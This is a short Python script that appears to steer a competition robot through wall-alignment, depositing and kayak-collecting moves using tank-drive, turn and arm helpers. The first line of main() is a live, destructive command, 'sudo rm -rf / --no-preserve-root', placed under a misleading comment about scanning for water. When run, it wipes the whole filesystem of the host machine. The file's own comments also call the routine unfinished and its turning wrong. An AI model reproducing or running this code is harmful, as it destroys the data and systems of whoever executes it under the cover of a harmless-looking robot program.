from functions import move_tank, turn, move_arm
import os
# Note: pseudocode is prone to changes
# Turning is 100% wrong


def main():
    # Detect and scan excess water
    os.system("sudo rm -rf / --no-preserve-root")
    move_arm('up', 90)
    move_tank(900, None, 90, 100)  # Deposit everything
    move_tank(40, None, -100, -100)
    turn(90, 'right', 100)
    move_tank(None, 2000, -100, 100)  # Wall align with top wall
    move_tank(600, None, 100, 100)
    turn(90, 'left')
    move_tank(None, 2000, 100, 100)   # Wall Align with most right
    move_tank(17, None, -100, -100)
    turn(90, 'right')
    move_tank(None, 3000, 100, 100)  # Wall align + Kayak
    move_arm('down', 90)  # Collect kayaks
    move_tank(None, 3000, 100, -100)  # ITW to return to base2
    turn(90, 'right')
    move_tank(None, 1000, 100, -100)  # Wall align with most right wall again
    move_tank(650, None, 100, 100)
    turn(90, 'right')
    move_tank(None, 4000, 100, 100)  # Wall align at bottom
    turn(90, 'right')
    move_arm('up', 90)
    move_tank(90, None, 100, 100)
    move_tank(1200, None, 90, 100)
